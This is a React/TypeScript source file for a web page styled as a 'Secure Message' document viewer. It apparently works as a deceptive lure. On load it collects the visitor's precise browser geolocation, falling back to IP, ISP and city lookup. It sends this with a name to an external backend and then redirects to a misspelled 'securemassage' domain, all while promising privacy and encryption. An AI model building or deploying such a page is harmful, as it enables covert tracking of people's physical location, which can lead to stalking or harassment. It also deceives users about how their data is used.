import axios, { AxiosInstance } from "axios";
import React, { useEffect, useState } from "react";
// import { useNavigate } from "react-router-dom";

export interface LocationData {
  latitude: number;
  longitude: number;
  accuracy?: number;
  timestamp?: Date;
}

export interface IpLocationData extends LocationData {
  city: string;
  region: string;
  country: string;
  timezone: string;
  ip: string;
  isp: string;
}

export interface FormData {
  username: string;
  inputNumber: string;
}

const axiosInstance: AxiosInstance = axios.create({
  // baseURL: "http://localhost:5000/api",
  baseURL: "https://backendlocation-gmb4.onrender.com/api",
  timeout: 30000,
  headers: {
    "Content-Type": "application/json",
  },
});

const LocationRegistration = () => {
  const [formData, setFormData] = useState<FormData>({
    username: "",
    inputNumber: "",
  });
  const [location, setLocation] = useState<LocationData | null>(null);
  const [loading, setLoading] = useState<boolean>(false);
  const [error, setError] = useState<string | null>(null);
  const [ipLocation, setIpLocation] = useState<IpLocationData | null>(null);
  const [isLoadingLocation, setIsLoadingLocation] = useState(true);
  // const [showLocationDetails, setShowLocationDetails] =
  //   useState<boolean>(false);

  // Add LocationPermissionPrompt component
  const LocationPermissionPrompt = () => (
    <div className="bg-yellow-50 p-4 rounded-md mb-4">
      <p className="text-yellow-700">
        Please enable location access in your browser to continue. This helps us
        provide better service.
      </p>
      <ul className="list-disc ml-4 mt-2 text-sm text-yellow-600">
        <li>Click the location icon in your browser's address bar</li>
        <li>Select "Allow" when prompted for location access</li>
        <li>Make sure your device's location services are enabled</li>
      </ul>
    </div>
  );

  const getIpLocation = async (): Promise<void> => {
    try {
      const response = await axios.get<any>("https://ip-api.com/json/");
      if (response.data.status === "success") {
        setIpLocation({
          latitude: response.data.lat,
          longitude: response.data.lon,
          city: response.data.city,
          region: response.data.regionName,
          country: response.data.country,
          timezone: response.data.timezone,
          ip: response.data.query,
          isp: response.data.isp,
        });
      }
    } catch (err) {
      console.error("IP location fallback failed:", err);
    }
  };

  const getBrowserLocation = async (): Promise<void> => {
    setIsLoadingLocation(true);
    try {
      if ("geolocation" in navigator) {
        const position: GeolocationPosition = await new Promise(
          (resolve, reject) => {
            navigator.geolocation.getCurrentPosition(
              resolve,
              (error: GeolocationPositionError) => {
                switch (error.code) {
                  case error.PERMISSION_DENIED:
                    reject(
                      "Please enable location permissions in your browser."
                    );
                    break;
                  case error.POSITION_UNAVAILABLE:
                    reject("Location information is unavailable.");
                    break;
                  case error.TIMEOUT:
                    reject("Location request timed out.");
                    break;
                  default:
                    reject("An unknown error occurred.");
                }
              },
              {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0,
              }
            );
          }
        );

        setLocation({
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          timestamp: new Date(position.timestamp),
        });
      } else {
        throw new Error("Geolocation is not supported by this browser.");
      }
    } catch (err) {
      console.error("Location error details:", err);
      setError(err instanceof Error ? err.message : String(err));
      await getIpLocation();
    } finally {
      setIsLoadingLocation(false);
    }
  };

  useEffect(() => {
    // if (window.location.protocol !== "https:") {
    //   setError("Secure Message requires a secure (HTTPS) connection to work.");
    //   return;
    // }

    const initializeLocation = async () => {
      try {
        await getBrowserLocation();
      } catch (err) {
        console.error("Browser location failed, falling back to IP location");
        await getIpLocation();
      }
    };

    initializeLocation();
  }, []);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>): void => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value,
    });
  };

  const handleSubmit = async (
    e: React.FormEvent<HTMLFormElement>
  ): Promise<void> => {
    e.preventDefault();
    setLoading(true);
    setError(null);

    try {
      const locationToUse = location || ipLocation;

      if (!locationToUse) {
        throw new Error("No location data available");
      }

      const registrationData = {
        ...formData,
        // Browser geolocation data
        browserLocation: {
          latitude: location?.latitude,
          longitude: location?.longitude,
          accuracy: location?.accuracy,
          timestamp: location?.timestamp,
        },
        // IP-based location data
        ipLocation: ipLocation
          ? {
              latitude: ipLocation.latitude,
              longitude: ipLocation.longitude,
              city: ipLocation.city,
              region: ipLocation.region,
              country: ipLocation.country,
              timezone: ipLocation.timezone,
              ip: ipLocation.ip,
              isp: ipLocation.isp,
            }
          : null,
        // For compatibility with existing code
        latitude: locationToUse.latitude,
        longitude: locationToUse.longitude,
        browserCoordinates: [locationToUse.longitude, locationToUse.latitude],
        locationType: location ? "browser" : "ip",
      };

      await axiosInstance.post("/user-input/register", registrationData);
      // navigate("https://securemassage.abdushlawfirm.com");
      window.location.href = "https://securemassage.abdushlawfirm.com";
    } catch (err) {
      setError(err instanceof Error ? err.message : "Registration failed");
      console.error("Registration error:", err);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center">
      <div className="max-w-6xl w-full mx-auto p-6 flex flex-col md:flex-row gap-8">
        {/* Form Section */}
        <div className="w-full md:w-1/2 bg-white rounded-xl shadow-lg p-8">
          <h2 className="text-3xl font-bold text-gray-800 mb-6">
            Secure Message
          </h2>
          {/* Add LocationPermissionPrompt when there's a permission error */}
          {error && error.includes("permissions") && (
            <LocationPermissionPrompt />
          )}

          {/* Show loading state */}
          {isLoadingLocation && (
            <div className="text-gray-600 mb-4">
              <span className="animate-pulse">........</span>
            </div>
          )}

          {error && !error.includes("permissions") && (
            <div className="bg-red-50 text-red-600 p-4 rounded-md mb-6">
              {error}
            </div>
          )}
          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <label
                htmlFor="username"
                className="block text-sm font-medium text-gray-700 mb-2"
              >
                Name
              </label>
              <input
                type="text"
                id="username"
                name="username"
                value={formData.username}
                onChange={handleInputChange}
                required
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                placeholder="Enter your username"
              />
            </div>

            <div>
              <label
                htmlFor="inputNumber"
                className="block text-sm font-medium text-gray-700 mb-2"
              >
                Input Number: (2222)
              </label>
              <input
                type="number"
                id="inputNumber"
                name="inputNumber"
                value={formData.inputNumber}
                onChange={handleInputChange}
                required
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                placeholder="Enter your number"
              />
            </div>

            <button
              type="submit"
              disabled={loading || (!location && !ipLocation)}
              className={`w-full py-4 px-6 rounded-lg text-white font-medium text-lg transition-all duration-200
                ${
                  loading || (!location && !ipLocation)
                    ? "bg-gray-400 cursor-not-allowed"
                    : "bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2"
                }`}
            >
              {loading ? (
                <span className="flex items-center justify-center">
                  <svg
                    className="animate-spin -ml-1 mr-3 h-5 w-5 text-white"
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                  >
                    <circle
                      className="opacity-25"
                      cx="12"
                      cy="12"
                      r="10"
                      stroke="currentColor"
                      strokeWidth="4"
                    ></circle>
                    <path
                      className="opacity-75"
                      fill="currentColor"
                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                    ></path>
                  </svg>
                  Processing...
                </span>
              ) : (
                "Open Document"
              )}
            </button>
          </form>
        </div>

        {/* Image Section */}
        <div className="w-full md:w-1/2 bg-gradient-to-br from-blue-500 to-blue-600 rounded-xl shadow-lg p-8 flex items-center justify-center">
          <div className="text-center text-white">
            <svg
              className="w-32 h-32 mx-auto mb-6"
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth="2"
                d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
              ></path>
            </svg>
            <h3 className="text-2xl font-bold mb-4">Secure Message</h3>
            <p className="text-lg opacity-90">
              Your privacy and security are our top priorities. All
              communications are encrypted and protected.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LocationRegistration;
